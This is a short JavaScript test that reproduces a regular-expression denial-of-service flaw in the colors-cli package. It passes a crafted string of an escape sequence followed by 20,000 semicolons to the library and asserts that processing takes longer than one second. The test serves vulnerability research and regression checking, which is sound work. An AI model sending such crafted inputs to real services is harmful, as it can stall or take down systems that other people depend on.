test("ReDos in colors-cli", () => {
  const measureTime = require("../utils").measureTime;
  const color = require("colors-cli/safe");
  let attack_str = "\x1B[" + ";".repeat(20000);
  let t = measureTime(function () {
    color.red(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
